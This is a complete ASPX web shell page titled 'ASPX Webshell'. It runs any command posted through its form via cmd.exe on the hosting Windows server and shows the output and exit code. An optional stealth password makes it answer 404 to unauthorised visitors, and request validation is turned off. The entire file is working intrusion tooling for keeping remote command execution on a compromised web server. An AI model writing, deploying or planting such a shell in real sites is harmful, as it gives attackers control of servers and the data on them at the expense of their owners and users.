<%@ Page Language="C#" Debug="true" ValidateRequest="false" %>
<%
    string stealthPassword = "";
    if(stealthPassword != "" && stealthPassword != Request.QueryString["pw"])
    {
        Response.StatusCode = 404;
        Response.End();
    }

    string cmd = Request.Form["cmd"];
    string fullCmd = "";
    StringBuilder output = new StringBuilder();
    Int32 exitCode = 0;
    if(cmd != null && cmd.Trim() != "")
    {
        System.Diagnostics.Process proc = new System.Diagnostics.Process();
        proc.StartInfo.FileName = "cmd.exe";
        proc.StartInfo.Arguments = "/c " + cmd;
        fullCmd = proc.StartInfo.FileName + " " + proc.StartInfo.Arguments;
        proc.StartInfo.UseShellExecute = false;
        proc.StartInfo.CreateNoWindow = true;
        proc.StartInfo.RedirectStandardOutput = true;
        proc.StartInfo.RedirectStandardError = true;
        System.Diagnostics.DataReceivedEventHandler handler = new System.Diagnostics.DataReceivedEventHandler(delegate(object sender, System.Diagnostics.DataReceivedEventArgs e) { output.Append(e.Data).Append(Environment.NewLine); });
        proc.OutputDataReceived += handler;
        proc.ErrorDataReceived += handler;
        proc.Start();
        proc.BeginOutputReadLine();
        proc.BeginErrorReadLine();
        proc.WaitForExit();
        exitCode = proc.ExitCode;
    }
%>
<!DOCTYPE html>
<html>
    <head>
        <meta charset="UTF-8">
        <title>ASPX Webshell</title>
        <style>
            body {
                font-family: sans-serif;
            }
            input[type=text] {
                font-family: monospace;
            }
            .cmdBox {
                width: 80%;
            }
            .infoText {
                margin: 3px auto;
            }
        </style>
    </head>
    <body>
        <form id="cmdForm" method="POST">
            <input type="text" id="cmd" name="cmd" placeholder="Enter command, use arrow keys for history" autofocus="autofocus" class="cmdBox">
            <input type="submit" value="Run">
        </form>
        <div class="infoText">
<%
    if(fullCmd != "")
    {
        Response.Write("Output of command: <code>" + HttpUtility.HtmlEncode(fullCmd) + "</code>");
    }
    else
    {
        Response.Write("Run a command to see its output");
    }
%>
        </div>
        <textarea readonly="readonly" rows="25" class="cmdBox">
<%= HttpUtility.HtmlEncode(output.ToString()) %>
        </textarea>
        <div class="infoText">
<%
    if(fullCmd != "")
    {
        Response.Write("Exit code: <code>" + exitCode + "</code>");
    }
%>
        </div>
        <script>
            function saveHistory() {
                var cmd = document.getElementById("cmd").value;
                if(cmd.trim() != "" && cmd != shellHistory[shellHistory.length - 1]) {
                    shellHistory.push(cmd);
                }
                sessionStorage.setItem("shellHistory", JSON.stringify(shellHistory));
            }
            function cycleHistory(event) {
                var cmdInput = document.getElementById("cmd");
                if(event.code == "ArrowUp" && historyPos > 0) {
                    historyPos--;
                    cmdInput.value = shellHistory[historyPos];
                } else if(event.code == "ArrowDown" && historyPos < shellHistory.length) {
                    historyPos++;
                    if(historyPos < shellHistory.length) {
                        cmdInput.value = shellHistory[historyPos];
                    } else {
                        cmdInput.value = "";
                    }
                }
                if(event.code == "ArrowUp" || event.code == "ArrowDown") {
                    cmdInput.setSelectionRange(cmdInput.value.length, cmdInput.value.length);
                    event.preventDefault();
                }
            }
            var shellHistory = JSON.parse(sessionStorage.getItem("shellHistory"));
            if(shellHistory == null) {
                shellHistory = new Array();
            }
            var historyPos = shellHistory.length;
            document.getElementById("cmdForm").addEventListener("submit", saveHistory);
            document.getElementById("cmd").addEventListener("keydown", cycleHistory);
        </script>
    </body>
</html>
